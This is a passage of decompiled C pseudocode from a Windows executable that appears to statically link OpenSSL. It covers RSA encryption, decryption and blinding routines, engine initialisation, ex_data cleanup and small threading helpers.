      if ( v3 != v13 )
        sub_413490(v3);
      return 1;
    }
    else
    {
      sub_408310(15, 110, 65, (int)"crypto\\ex_data.c", 283);
      return 0;
    }
  }
  return result;
}
// 414CC9: conditional instruction was optimized away because edi.4>=1

//----- (00414DC0) --------------------------------------------------------
void __cdecl sub_414DC0(unsigned int a1, int a2, int **a3)
{
  char *v3; // edi
  int *v4; // eax
  int **v5; // ebx
  int v6; // eax
  int v7; // ebp
  int i; // esi
  int j; // esi
  int v10; // eax
  int v11; // eax
  char v12[40]; // [esp+Ch] [ebp-28h] BYREF

  v3 = 0;
  v4 = (int *)sub_414960(a1);
  v5 = (int **)v4;
  if ( !v4 )
    return;
  v6 = sub_426A30(*v4);
  v7 = v6;
  if ( v6 > 0 )
  {
    if ( v6 < 10 )
    {
      v3 = v12;
      goto LABEL_6;
    }
    v3 = (char *)sub_4133F0(4 * v6);
    if ( v3 )
    {
LABEL_6:
      for ( i = 0; i < v7; ++i )
        *(_DWORD *)&v3[4 * i] = sub_426A40(*v5, i);
    }
  }
  sub_4146B0(dword_538920);
  if ( v7 <= 0 || v3 )
  {
    for ( j = 0; j < v7; ++j )
    {
      v10 = *(_DWORD *)&v3[4 * j];
      if ( v10 && *(_DWORD *)(v10 + 12) )
      {
        if ( *a3 && j < sub_426A30((int)*a3) )
          v11 = sub_426A40(*a3, j);
        else
          v11 = 0;
        (*(void (__cdecl **)(int, int, int **, int, _DWORD, _DWORD))(*(_DWORD *)&v3[4 * j] + 12))(
          a2,
          v11,
          a3,
          j,
          **(_DWORD **)&v3[4 * j],
          *(_DWORD *)(*(_DWORD *)&v3[4 * j] + 4));
      }
    }
    if ( v3 != v12 )
      sub_413490(v3);
    sub_4269F0((void **)*a3);
    *a3 = 0;
  }
  else
  {
    sub_408310(15, 111, 65, "crypto\\ex_data.c", 328);
  }
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00414F10) --------------------------------------------------------
int sub_414F10()
{
  int result; // eax

  if ( dword_538AD8 )
  {
    dword_538AD8 = 0;
    return WSACleanup();
  }
  return result;
}
// 538AD8: using guessed type int dword_538AD8;

//----- (00414F30) --------------------------------------------------------
char **sub_414F30()
{
  return &off_53129C;
}
// 53129C: using guessed type char *off_53129C;

//----- (00414F40) --------------------------------------------------------
int __cdecl sub_414F40(int Size, void *Src, char *a3, int a4, int a5)
{
  int v6; // esi
  _BYTE *v7; // ebp
  int *v9; // eax
  int *v10; // ebx
  _BYTE *v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  _DWORD *v15; // [esp+Ch] [ebp-8h]
  int v16; // [esp+10h] [ebp-4h]
  _DWORD *v17; // [esp+24h] [ebp+10h]

  v6 = 0;
  v16 = -1;
  v7 = 0;
  if ( sub_416F90(*(_DWORD **)(a4 + 16)) > 0x4000 )
  {
    sub_408310(4, 104, 105, (int)"crypto\\rsa\\rsa_ossl.c", 60);
    return -1;
  }
  if ( sub_416960(*(_DWORD **)(a4 + 16), *(int **)(a4 + 20)) <= 0 )
  {
    sub_408310(4, 104, 101, (int)"crypto\\rsa\\rsa_ossl.c", 65);
    return -1;
  }
  if ( sub_416F90(*(_DWORD **)(a4 + 16)) > 3072 && sub_416F90(*(_DWORD **)(a4 + 20)) > 64 )
  {
    sub_408310(4, 104, 101, (int)"crypto\\rsa\\rsa_ossl.c", 72);
    return -1;
  }
  v9 = sub_420670();
  v10 = v9;
  if ( v9 )
  {
    sub_420700(v9);
    v17 = sub_420790(v10);
    v15 = sub_420790(v10);
    v6 = (sub_416F90(*(_DWORD **)(a4 + 16)) + 7) / 8;
    v11 = sub_4133F0(v6);
    v7 = v11;
    if ( v17 && v15 && v11 )
    {
      switch ( a5 )
      {
        case 1:
          v12 = sub_4295A0(v11, v6, Src, Size);
          goto LABEL_18;
        case 2:
          v12 = sub_428B50(v11, v6, Src, Size);
          goto LABEL_18;
        case 3:
          v12 = sub_428A90(v11, v6, Src, Size);
          goto LABEL_18;
        case 4:
          v12 = sub_4293B0(v11, v6, Src, Size, 0, 0);
LABEL_18:
          if ( v12 > 0 && sub_4174D0(v7, v6, (int)v17) )
          {
            if ( sub_416960(v17, *(int **)(a4 + 16)) < 0 )
            {
              if ( ((*(_BYTE *)(a4 + 56) & 2) == 0
                 || sub_428A00((_DWORD **)(a4 + 60), *(LPCRITICAL_SECTION *)(a4 + 84), *(int ***)(a4 + 16), v10))
                && (*(int (__cdecl **)(_DWORD *, _DWORD *, _DWORD, _DWORD, int *, _DWORD))(*(_DWORD *)(a4 + 8) + 24))(
                     v15,
                     v17,
                     *(_DWORD *)(a4 + 20),
                     *(_DWORD *)(a4 + 16),
                     v10,
                     *(_DWORD *)(a4 + 60)) )
              {
                v13 = sub_416F90(v15);
                v14 = sub_417300(v15, &a3[v6 - (v13 + 7) / 8]);
                if ( v6 - v14 > 0 )
                  memset(a3, 0, v6 - v14);
                v16 = v6;
              }
            }
            else
            {
              sub_408310(4, 104, 132, (int)"crypto\\rsa\\rsa_ossl.c", 115);
            }
          }
          break;
        default:
          sub_408310(4, 104, 118, (int)"crypto\\rsa\\rsa_ossl.c", 103);
          break;
      }
    }
    else
    {
      sub_408310(4, 104, 65, (int)"crypto\\rsa\\rsa_ossl.c", 85);
    }
    sub_420750(v10);
  }
  sub_4206C0((void **)v10);
  sub_4134B0(v7, v6);
  return v16;
}

//----- (00415200) --------------------------------------------------------
int __usercall sub_415200@<eax>(_DWORD *a1@<ebx>, int a2@<esi>, __m64 a3@<mm0>, int *Block)
{
  int v4; // edi

  sub_414690(*(LPCRITICAL_SECTION *)(a2 + 84));
  if ( !*(_DWORD *)(a2 + 76) )
    *(_DWORD *)(a2 + 76) = sub_407220(a3, a2, Block);
  v4 = *(_DWORD *)(a2 + 76);
  if ( v4 )
  {
    if ( sub_416420(*(_DWORD *)(a2 + 76)) )
    {
      *a1 = 1;
      sub_4146B0(*(LPCRITICAL_SECTION *)(a2 + 84));
      return v4;
    }
    *a1 = 0;
    if ( !*(_DWORD *)(a2 + 80) )
      *(_DWORD *)(a2 + 80) = sub_407220(a3, a2, Block);
    v4 = *(_DWORD *)(a2 + 80);
  }
  sub_4146B0(*(LPCRITICAL_SECTION *)(a2 + 84));
  return v4;
}

//----- (00415280) --------------------------------------------------------
int __usercall sub_415280@<eax>(
        _DWORD *a1@<ecx>,
        int *a2@<ebx>,
        struct _RTL_CRITICAL_SECTION *a3@<esi>,
        __m64 a4@<mm0>,
        int *a5)
{
  int v7; // edi

  if ( !a1 )
    return sub_416780(a4, a5, 0, (int)a3, a2);
  sub_416450(a3);
  v7 = sub_416780(a4, a5, a1, (int)a3, a2);
  sub_416460(a3);
  return v7;
}

//----- (004152C0) --------------------------------------------------------
int __usercall sub_4152C0@<eax>(__m64 a1@<mm0>, size_t Size, void *Src, char *a4, int a5, int a6)
{
  _BYTE *v6; // esi
  int v7; // ebp
  int *v8; // eax
  int *v9; // ebx
  _BYTE *v10; // eax
  _BYTE *v11; // esi
  int v12; // eax
  struct _RTL_CRITICAL_SECTION *v13; // esi
  unsigned int **v14; // eax
  _DWORD *v15; // esi
  int *v16; // esi
  int v17; // eax
  int v18; // eax
  _DWORD *v20; // [esp-14h] [ebp-40h]
  int v21; // [esp-8h] [ebp-34h]
  int *v22; // [esp+Ch] [ebp-20h]
  int *v23; // [esp+10h] [ebp-1Ch]
  int *v24; // [esp+14h] [ebp-18h]
  unsigned int **v25; // [esp+18h] [ebp-14h]
  void *Block; // [esp+1Ch] [ebp-10h] BYREF
  struct _RTL_CRITICAL_SECTION *v27; // [esp+20h] [ebp-Ch]
  int v28; // [esp+24h] [ebp-8h]
  _BYTE *v29; // [esp+28h] [ebp-4h]

  v6 = 0;
  v7 = 0;
  v28 = -1;
  Block = 0;
  v25 = 0;
  v27 = 0;
  v8 = sub_420670();
  v9 = v8;
  v23 = v8;
  if ( v8 )
  {
    sub_420700(v8);
    v22 = sub_420790(v9);
    v24 = sub_420790(v9);
    v7 = (sub_416F90(*(_DWORD **)(a5 + 16)) + 7) / 8;
    v10 = sub_4133F0(v7);
    v11 = v10;
    v29 = v10;
    if ( v22 && v24 && v10 )
    {
      switch ( a6 )
      {
        case 1:
          v12 = sub_429410(v10, v7, Src, Size);
          break;
        case 3:
          v12 = sub_428A90(v10, v7, Src, Size);
          break;
        case 5:
          v12 = sub_4297F0(v10, v7, Src, Size);
          break;
        default:
          sub_408310(4, 102, 118, (int)"crypto\\rsa\\rsa_ossl.c", 262);
LABEL_50:
          sub_420750(v9);
          v6 = v29;
          goto LABEL_51;
      }
      if ( v12 <= 0 || !sub_4174D0(v11, v7, (int)v22) )
        goto LABEL_50;
      if ( sub_416960(v22, *(int **)(a5 + 16)) >= 0 )
      {
        sub_408310(4, 102, 132, (int)"crypto\\rsa\\rsa_ossl.c", 274);
        goto LABEL_50;
      }
      if ( *(char *)(a5 + 56) >= 0 )
      {
        v13 = (struct _RTL_CRITICAL_SECTION *)sub_415200(&Block, a5, a1, v9);
        v27 = v13;
        if ( !v13 )
        {
          sub_408310(4, 102, 68, (int)"crypto\\rsa\\rsa_ossl.c", 281);
          v9 = v23;
          goto LABEL_50;
        }
        if ( Block )
        {
          v14 = 0;
        }
        else
        {
          v14 = (unsigned int **)sub_420790(v23);
          v25 = v14;
          if ( !v14 )
          {
            sub_408310(4, 102, 65, (int)"crypto\\rsa\\rsa_ossl.c", 288);
            v9 = v23;
            goto LABEL_50;
          }
        }
        v9 = v23;
        if ( !sub_415280(v14, v23, v13, a1, v22) )
          goto LABEL_50;
      }
      if ( (*(_BYTE *)(a5 + 56) & 0x20) != 0
        || *(_DWORD *)(a5 + 28)
        && *(_DWORD *)(a5 + 32)
        && *(_DWORD *)(a5 + 36)
        && *(_DWORD *)(a5 + 40)
        && *(_DWORD *)(a5 + 44) )
      {
        if ( !(*(int (__cdecl **)(int *, int *, int, int *))(*(_DWORD *)(a5 + 8) + 20))(v24, v22, a5, v9) )
          goto LABEL_50;
        v16 = v24;
      }
      else
      {
        v15 = sub_4168C0();
        Block = v15;
        if ( !v15 )
        {
          v21 = 304;
LABEL_49:
          sub_408310(4, 102, 65, (int)"crypto\\rsa\\rsa_ossl.c", v21);
          goto LABEL_50;
        }
        sub_416E80(v15, *(_DWORD **)(a5 + 24), 4);
        if ( (*(_BYTE *)(a5 + 56) & 2) != 0
          && !sub_428A00((_DWORD **)(a5 + 60), *(LPCRITICAL_SECTION *)(a5 + 84), *(int ***)(a5 + 16), v9) )
        {
          sub_417060((void **)v15);
          goto LABEL_50;
        }
        v20 = v15;
        v16 = v24;
        if ( !(*(int (__cdecl **)(int *, int *, _DWORD *, _DWORD, int *, _DWORD))(*(_DWORD *)(a5 + 8) + 24))(
                v24,
                v22,
                v20,
                *(_DWORD *)(a5 + 16),
                v9,
                *(_DWORD *)(a5 + 60)) )
        {
          sub_417060((void **)Block);
          goto LABEL_50;
        }
        sub_417060((void **)Block);
      }
      if ( !v27 || sub_4163B0(v16, v25, (int)v27, v9) )
      {
        if ( a6 == 5 )
        {
          sub_422020(v22, *(_DWORD *)(a5 + 16), (int)v16);
          if ( sub_4169B0(v16, v22) > 0 )
            v16 = v22;
        }
        v17 = sub_416F90(v16);
        v18 = sub_417300(v16, &a4[v7 - (v17 + 7) / 8]);
        if ( v7 - v18 > 0 )
          memset(a4, 0, v7 - v18);
        v28 = v7;
      }
      goto LABEL_50;
    }
    v21 = 246;
    goto LABEL_49;
  }
LABEL_51:
  sub_4206C0((void **)v9);
  sub_4134B0(v6, v7);
  return v28;
}

//----- (00415660) --------------------------------------------------------
int __usercall sub_415660@<eax>(__m64 a1@<mm0>, int a2, _BYTE *a3, void *a4, int a5, int a6)
{
  _BYTE *v6; // esi
  int v7; // ebp
  int *v8; // eax
  int *v9; // ebx
  int *v10; // esi
  void *v11; // eax
  struct _RTL_CRITICAL_SECTION *v12; // esi
  unsigned int **v13; // eax
  void **v14; // eax
  int *v15; // edi
  _BYTE *v16; // esi
  int v17; // eax
  int v18; // eax
  int *Block; // [esp+Ch] [ebp-20h]
  void **Blocka; // [esp+Ch] [ebp-20h]
  int v22; // [esp+10h] [ebp-1Ch]
  int *v23; // [esp+14h] [ebp-18h]
  unsigned int **v24; // [esp+18h] [ebp-14h]
  int v25; // [esp+1Ch] [ebp-10h] BYREF
  int *v26; // [esp+20h] [ebp-Ch]
  struct _RTL_CRITICAL_SECTION *v27; // [esp+24h] [ebp-8h]
  void *Src; // [esp+28h] [ebp-4h]

  v6 = 0;
  v7 = 0;
  v22 = -1;
  v25 = 0;
  v24 = 0;
  v27 = 0;
  v8 = sub_420670();
  v9 = v8;
  Block = v8;
  if ( v8 )
  {
    sub_420700(v8);
    v10 = sub_420790(v9);
    v26 = v10;
    v23 = sub_420790(v9);
    v7 = (sub_416F90(*(_DWORD **)(a5 + 16)) + 7) / 8;
    v11 = sub_4133F0(v7);
    Src = v11;
    if ( !v10 || !v23 || !v11 )
    {
      sub_408310(4, 101, 65, (int)"crypto\\rsa\\rsa_ossl.c", 381);
      goto LABEL_45;
    }
    if ( a2 <= v7 )
    {
      if ( sub_4174D0(a3, a2, (int)v10) )
      {
        if ( sub_416960(v10, *(int **)(a5 + 16)) < 0 )
        {
          if ( *(char *)(a5 + 56) >= 0 )
          {
            v12 = (struct _RTL_CRITICAL_SECTION *)sub_415200(&v25, a5, a1, v9);
            v27 = v12;
            if ( !v12 )
            {
              sub_408310(4, 101, 68, (int)"crypto\\rsa\\rsa_ossl.c", 408);
              v9 = Block;
              goto LABEL_45;
            }
            if ( v25 )
            {
              v13 = 0;
            }
            else
            {
              v13 = (unsigned int **)sub_420790(Block);
              v24 = v13;
              if ( !v13 )
              {
                sub_408310(4, 101, 65, (int)"crypto\\rsa\\rsa_ossl.c", 415);
                v9 = Block;
                goto LABEL_45;
              }
            }
            v9 = Block;
            if ( !sub_415280(v13, Block, v12, a1, v26) )
              goto LABEL_45;
            v10 = v26;
          }
          if ( (*(_BYTE *)(a5 + 56) & 0x20) != 0
            || *(_DWORD *)(a5 + 28)
            && *(_DWORD *)(a5 + 32)
            && *(_DWORD *)(a5 + 36)
            && *(_DWORD *)(a5 + 40)
            && *(_DWORD *)(a5 + 44) )
          {
            if ( !(*(int (__cdecl **)(int *, int *, int, int *))(*(_DWORD *)(a5 + 8) + 20))(v23, v10, a5, v9) )
              goto LABEL_45;
            v15 = v23;
          }
          else
          {
            v14 = (void **)sub_4168C0();
            Blocka = v14;
            if ( !v14 )
            {
              sub_408310(4, 101, 65, (int)"crypto\\rsa\\rsa_ossl.c", 432);
              goto LABEL_45;
            }
            sub_416E80(v14, *(_DWORD **)(a5 + 24), 4);
            if ( (*(_BYTE *)(a5 + 56) & 2) != 0
              && !sub_428A00((_DWORD **)(a5 + 60), *(LPCRITICAL_SECTION *)(a5 + 84), *(int ***)(a5 + 16), v9)
              || (v15 = v23,
                  !(*(int (__cdecl **)(int *, int *, void **, _DWORD, int *, _DWORD))(*(_DWORD *)(a5 + 8) + 24))(
                     v23,
                     v10,
                     Blocka,
                     *(_DWORD *)(a5 + 16),
                     v9,
                     *(_DWORD *)(a5 + 60))) )
            {
              sub_417060(Blocka);
              goto LABEL_45;
            }
            sub_417060(Blocka);
          }
          if ( !v27 || sub_4163B0(v15, v24, (int)v27, v9) )
          {
            v16 = Src;
            v17 = sub_417300(v15, (char *)Src);
            switch ( a6 )
            {
              case 1:
                v18 = sub_429650(a4, v7, v16, v17, v7);
                goto LABEL_41;
              case 2:
                v18 = sub_428C00(a4, v7, v16, v17, v7);
                goto LABEL_41;
              case 3:
                v18 = sub_428AF0((char *)a4, v7, v16, v17);
                goto LABEL_41;
              case 4:
                v18 = sub_4293E0(a4, v7, v16, v17, v7, 0, 0);
LABEL_41:
                v22 = v18;
                if ( v18 < 0 )
                  sub_408310(4, 101, 114, (int)"crypto\\rsa\\rsa_ossl.c", 477);
                break;
              default:
                sub_408310(4, 101, 118, (int)"crypto\\rsa\\rsa_ossl.c", 473);
                break;
            }
          }
          goto LABEL_45;
        }
        sub_408310(4, 101, 132, (int)"crypto\\rsa\\rsa_ossl.c", 401);
      }
    }
    else
    {
      sub_408310(4, 101, 108, (int)"crypto\\rsa\\rsa_ossl.c", 391);
    }
LABEL_45:
    sub_420750(v9);
    v6 = Src;
  }
  sub_4206C0((void **)v9);
  sub_4134B0(v6, v7);
  return v22;
}

//----- (004159F0) --------------------------------------------------------
int __cdecl sub_4159F0(int a1, _BYTE *a2, void *a3, int a4, int a5)
{
  int v6; // esi
  char *v7; // ebp
  int *v9; // eax
  int *v10; // ebx
  _DWORD *v11; // ebp
  char *v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // [esp+Ch] [ebp-8h]
  char *Src; // [esp+10h] [ebp-4h]
  _DWORD *v17; // [esp+24h] [ebp+10h]

  v6 = 0;
  v15 = -1;
  v7 = 0;
  if ( sub_416F90(*(_DWORD **)(a4 + 16)) > 0x4000 )
  {
    sub_408310(4, 103, 105, (int)"crypto\\rsa\\rsa_ossl.c", 498);
    return -1;
  }
  if ( sub_416960(*(_DWORD **)(a4 + 16), *(int **)(a4 + 20)) <= 0 )
  {
    sub_408310(4, 103, 101, (int)"crypto\\rsa\\rsa_ossl.c", 503);
    return -1;
  }
  if ( sub_416F90(*(_DWORD **)(a4 + 16)) > 3072 && sub_416F90(*(_DWORD **)(a4 + 20)) > 64 )
  {
    sub_408310(4, 103, 101, (int)"crypto\\rsa\\rsa_ossl.c", 510);
    return -1;
  }
  v9 = sub_420670();
  v10 = v9;
  if ( v9 )
  {
    sub_420700(v9);
    v11 = sub_420790(v10);
    v17 = sub_420790(v10);
    v6 = (sub_416F90(*(_DWORD **)(a4 + 16)) + 7) / 8;
    v12 = (char *)sub_4133F0(v6);
    Src = v12;
    if ( !v11 || !v17 || !v12 )
    {
      sub_408310(4, 103, 65, (int)"crypto\\rsa\\rsa_ossl.c", 523);
      goto LABEL_34;
    }
    if ( a1 <= v6 )
    {
      if ( sub_4174D0(a2, a1, (int)v11) )
      {
        if ( sub_416960(v11, *(int **)(a4 + 16)) < 0 )
        {
          if ( (*(_BYTE *)(a4 + 56) & 2) != 0
            && !sub_428A00((_DWORD **)(a4 + 60), *(LPCRITICAL_SECTION *)(a4 + 84), *(int ***)(a4 + 16), v10)
            || !(*(int (__cdecl **)(_DWORD *, _DWORD *, _DWORD, _DWORD, int *, _DWORD))(*(_DWORD *)(a4 + 8) + 24))(
                  v17,
                  v11,
                  *(_DWORD *)(a4 + 20),
                  *(_DWORD *)(a4 + 16),
                  v10,
                  *(_DWORD *)(a4 + 60))
            || a5 == 5
            && (*(_BYTE *)sub_435D30((int)v17) & 0xF) != 12
            && !sub_422020(v17, *(_DWORD *)(a4 + 16), (int)v17) )
          {
            goto LABEL_34;
          }
          v13 = sub_417300(v17, Src);
          switch ( a5 )
          {
            case 1:
              v14 = sub_429480(a3, v6, Src, v13, v6);
              break;
            case 3:
              v14 = sub_428AF0((char *)a3, v6, Src, v13);
              break;
            case 5:
              v14 = sub_429870(a3, v6, Src, v13, v6);
              break;
            default:
              sub_408310(4, 103, 118, (int)"crypto\\rsa\\rsa_ossl.c", 572);
              goto LABEL_34;
          }
          v15 = v14;
          if ( v14 < 0 )
            sub_408310(4, 103, 114, (int)"crypto\\rsa\\rsa_ossl.c", 576);
          goto LABEL_34;
        }
        sub_408310(4, 103, 132, (int)"crypto\\rsa\\rsa_ossl.c", 541);
      }
    }
    else
    {
      sub_408310(4, 103, 108, (int)"crypto\\rsa\\rsa_ossl.c", 532);
    }
LABEL_34:
    sub_420750(v10);
    v7 = Src;
  }
  sub_4206C0((void **)v10);
  sub_4134B0(v7, v6);
  return v15;
}

//----- (00415CB0) --------------------------------------------------------
int __cdecl sub_415CB0(unsigned int **a1, _DWORD *a2, int a3, int *a4)
{
  unsigned int **v4; // ebp
  void **v5; // ebx
  void **v6; // eax
  void **v7; // esi
  void **v8; // eax
  int **v10; // eax
  void **v11; // ebx
  void **v12; // eax
  int v13; // ecx
  int v14; // eax
  void **v15; // eax
  void **v16; // ebp
  void **v17; // [esp-4h] [ebp-24h]
  int **Block; // [esp+10h] [ebp-10h]
  void **Blocka; // [esp+10h] [ebp-10h]
  _DWORD *v20; // [esp+14h] [ebp-Ch]
  _DWORD *v21; // [esp+1Ch] [ebp-4h]

  sub_420700(a4);
  v4 = (unsigned int **)sub_420790(a4);
  v20 = sub_420790(a4);
  v21 = sub_420790(a4);
  v5 = (void **)sub_4168C0();
  v6 = (void **)sub_4168C0();
  v7 = v6;
  Block = (int **)v6;
  if ( !v5 || !v6 )
  {
    sub_417060(v5);
    sub_417060(v7);
    goto LABEL_43;
  }
  sub_416E80(v5, *(_DWORD **)(a3 + 28), 4);
  sub_416E80(Block, *(_DWORD **)(a3 + 32), 4);
  if ( (*(_BYTE *)(a3 + 56) & 4) != 0
    && (!sub_428A00((_DWORD **)(a3 + 64), *(LPCRITICAL_SECTION *)(a3 + 84), (int **)v5, a4)
     || !sub_428A00((_DWORD **)(a3 + 68), *(LPCRITICAL_SECTION *)(a3 + 84), Block, a4)) )
  {
    goto LABEL_15;
  }
  sub_417060(v5);
  sub_417060((void **)Block);
  if ( (*(_BYTE *)(a3 + 56) & 2) != 0
    && !sub_428A00((_DWORD **)(a3 + 60), *(LPCRITICAL_SECTION *)(a3 + 84), *(int ***)(a3 + 16), a4) )
  {
    goto LABEL_43;
  }
  v8 = (void **)sub_4168C0();
  v5 = v8;
  if ( !v8 )
    goto LABEL_43;
  sub_416E80(v8, a2, 4);
  if ( !sub_4299A0(0, (int)v4, v5, *(int **)(a3 + 32), a4) || (v10 = (int **)sub_4168C0(), (Block = v10) == 0) )
  {
    v17 = v5;
    goto LABEL_12;
  }
  sub_416E80(v10, *(_DWORD **)(a3 + 40), 4);
  if ( !(*(int (__cdecl **)(_DWORD *, unsigned int **, int **, _DWORD, int *, _DWORD))(*(_DWORD *)(a3 + 8) + 24))(
          v20,
          v4,
          Block,
          *(_DWORD *)(a3 + 32),
          a4,
          *(_DWORD *)(a3 + 68)) )
  {
LABEL_15:
    sub_417060(v5);
    sub_417060((void **)Block);
    goto LABEL_43;
  }
  sub_417060((void **)Block);
  v17 = v5;
  if ( !sub_4299A0(0, (int)v4, v5, *(int **)(a3 + 28), a4) )
  {
LABEL_12:
    sub_417060(v17);
    sub_420750(a4);
    return 0;
  }
  sub_417060(v5);
  v11 = (void **)sub_4168C0();
  Blocka = v11;
  if ( v11 )
  {
    sub_416E80(v11, *(_DWORD **)(a3 + 36), 4);
    if ( !(*(int (__cdecl **)(unsigned int **, unsigned int **, void **, _DWORD, int *, _DWORD))(*(_DWORD *)(a3 + 8) + 24))(
            a1,
            v4,
            v11,
            *(_DWORD *)(a3 + 28),
            a4,
            *(_DWORD *)(a3 + 64)) )
      goto LABEL_19;
    sub_417060(v11);
    if ( !sub_422020(a1, (int)a1, (int)v20) || sub_416E40((int)a1) && !sub_4220E0(a1, (int)a1, *(_DWORD *)(a3 + 28)) )
      goto LABEL_43;
    if ( !sub_421C20(v4, a1, *(unsigned int ***)(a3 + 44), a4) )
      goto LABEL_43;
    v12 = (void **)sub_4168C0();
    Blocka = v12;
    if ( !v12 )
      goto LABEL_43;
    sub_416E80(v12, v4, 4);
    if ( !sub_4299A0(0, (int)a1, Blocka, *(int **)(a3 + 28), a4) )
    {
LABEL_19:
      sub_417060(Blocka);
      sub_420750(a4);
      return 0;
    }
    sub_417060(Blocka);
    if ( (!sub_416E40((int)a1) || sub_4220E0(a1, (int)a1, *(_DWORD *)(a3 + 28)))
      && sub_421C20(v4, a1, *(unsigned int ***)(a3 + 32), a4)
      && sub_4220E0(a1, (int)v4, (int)v20) )
    {
      v13 = *(_DWORD *)(a3 + 20);
      if ( !v13 )
        goto LABEL_41;
      v14 = *(_DWORD *)(a3 + 16);
      if ( !v14 )
        goto LABEL_41;
      if ( !(*(int (__cdecl **)(_DWORD *, unsigned int **, int, int, int *, _DWORD))(*(_DWORD *)(a3 + 8) + 24))(
              v21,
              a1,
              v13,
              v14,
              a4,
              *(_DWORD *)(a3 + 60))
        || !sub_422020(v21, (int)v21, (int)a2)
        || !sub_4299A0(0, (int)v21, v21, *(int **)(a3 + 16), a4)
        || sub_416E40((int)v21) && !sub_4220E0(v21, (int)v21, *(_DWORD *)(a3 + 16)) )
      {
        goto LABEL_43;
      }
      if ( sub_416DB0((int)v21) )
      {
LABEL_41:
        sub_420750(a4);
        return 1;
      }
      v15 = (void **)sub_4168C0();
      v16 = v15;
      if ( !v15 )
        goto LABEL_43;
      sub_416E80(v15, *(_DWORD **)(a3 + 24), 4);
      v17 = v16;
      if ( (*(int (__cdecl **)(unsigned int **, _DWORD *, void **, _DWORD, int *, _DWORD))(*(_DWORD *)(a3 + 8) + 24))(
             a1,
             a2,
             v16,
             *(_DWORD *)(a3 + 16),
             a4,
             *(_DWORD *)(a3 + 60)) )
      {
        sub_417060(v16);
        goto LABEL_41;
      }
      goto LABEL_12;
    }
  }
LABEL_43:
  sub_420750(a4);
  return 0;
}

//----- (00416100) --------------------------------------------------------
int __cdecl sub_416100(int a1)
{
  *(_DWORD *)(a1 + 56) |= 6u;
  return 1;
}

//----- (00416110) --------------------------------------------------------
int __cdecl sub_416110(_DWORD **a1)
{
  sub_4285A0(a1[15]);
  sub_4285A0(a1[16]);
  sub_4285A0(a1[17]);
  return 1;
}

//----- (00416140) --------------------------------------------------------
int __cdecl sub_416140(_DWORD *a1)
{
  int result; // eax
  int (__cdecl *v2)(_DWORD *); // ecx

  result = 1;
  if ( a1[21] || (v2 = (int (__cdecl *)(_DWORD *))a1[12]) == 0 || (result = v2(a1)) != 0 )
  {
    ++a1[20];
    ++a1[21];
  }
  return result;
}

//----- (00416170) --------------------------------------------------------
int __cdecl sub_416170(volatile LONG *Block, int a2)
{
  bool v2; // zf
  int v3; // edi

  v2 = (*((_DWORD *)Block + 21))-- == 1;
  v3 = 1;
  if ( v2 && *((_DWORD *)Block + 13) )
  {
    if ( a2 )
      sub_4146B0(dword_73C6C0);
    v3 = (*((int (__cdecl **)(volatile LONG *))Block + 13))(Block);
    if ( a2 )
      sub_414690(dword_73C6C0);
    if ( !v3 )
      return 0;
  }
  if ( !sub_429EE0(Block, 0) )
  {
    sub_408310(38, 191, 106, "crypto\\engine\\eng_init.c", 69);
    return 0;
  }
  return v3;
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00416200) --------------------------------------------------------
int __cdecl sub_416200(_DWORD *a1)
{
  int v2; // edi
  int (__cdecl *v3)(_DWORD *); // eax

  if ( a1 )
  {
    if ( (sub_414700(&dword_53901C, (void (*)(void))sub_42A220) ? dword_539020 : 0) != 0 )
    {
      sub_414690(dword_73C6C0);
      v2 = 1;
      if ( a1[21] || (v3 = (int (__cdecl *)(_DWORD *))a1[12]) == 0 || (v2 = v3(a1)) != 0 )
      {
        ++a1[20];
        ++a1[21];
      }
      sub_4146B0(dword_73C6C0);
      return v2;
    }
    else
    {
      sub_408310(38, 119, 65, (int)"crypto\\engine\\eng_init.c", 84);
      return 0;
    }
  }
  else
  {
    sub_408310(38, 119, 67, (int)"crypto\\engine\\eng_init.c", 80);
    return 0;
  }
}
// 539020: using guessed type int dword_539020;

//----- (004162A0) --------------------------------------------------------
int __cdecl sub_4162A0(volatile LONG *Block)
{
  bool v2; // zf
  int v3; // edi
  int v4; // esi

  if ( !Block )
    return 1;
  sub_414690(dword_73C6C0);
  v2 = (*((_DWORD *)Block + 21))-- == 1;
  v3 = 1;
  if ( v2
    && *((_DWORD *)Block + 13)
    && (sub_4146B0(dword_73C6C0),
        v3 = (*((int (__cdecl **)(volatile LONG *))Block + 13))(Block),
        sub_414690(dword_73C6C0),
        !v3) )
  {
    v4 = 0;
  }
  else if ( sub_429EE0(Block, 0) )
  {
    v4 = v3;
  }
  else
  {
    sub_408310(38, 191, 106, (int)"crypto\\engine\\eng_init.c", 69);
    v4 = 0;
  }
  sub_4146B0(dword_73C6C0);
  if ( v4 )
    return v4;
  sub_408310(38, 107, 106, (int)"crypto\\engine\\eng_init.c", 104);
  return 0;
}

//----- (00416360) --------------------------------------------------------
void __cdecl sub_416360(void *Block)
{
  if ( Block )
  {
    sub_417060(*(void ***)Block);
    sub_417060(*((void ***)Block + 1));
    sub_417060(*((void ***)Block + 2));
    sub_417060(*((void ***)Block + 3));
    sub_4146D0(*((LPCRITICAL_SECTION *)Block + 9));
    sub_413490(Block);
  }
}

//----- (004163B0) --------------------------------------------------------
int __cdecl sub_4163B0(int *a1, unsigned int **a2, int a3, int *a4)
{
  unsigned int **v5; // eax

  if ( a2 )
    return sub_42A430(a1, a1, a2, *(int **)(a3 + 12), a4);
  v5 = *(unsigned int ***)(a3 + 4);
  if ( v5 )
    return sub_42A430(a1, a1, v5, *(int **)(a3 + 12), a4);
  sub_408310(3, 101, 107, (int)"crypto\\bn\\bn_blind.c", 174);
  return 0;
}

//----- (00416420) --------------------------------------------------------
BOOL __cdecl sub_416420(int a1)
{
  int CurrentThreadId; // eax
  int v3; // [esp-4h] [ebp-4h]

  v3 = *(_DWORD *)(a1 + 16);
  CurrentThreadId = GetCurrentThreadId();
  return sub_4147D0(CurrentThreadId, v3);
}

//----- (00416440) --------------------------------------------------------
DWORD __cdecl sub_416440(int a1)
{
  DWORD result; // eax

  result = GetCurrentThreadId();
  *(_DWORD *)(a1 + 16) = result;
  return result;
}

//----- (00416450) --------------------------------------------------------
int __cdecl sub_416450(LPCRITICAL_SECTION lpCriticalSection)
{
  return sub_414690((LPCRITICAL_SECTION)lpCriticalSection[1].OwningThread);
}

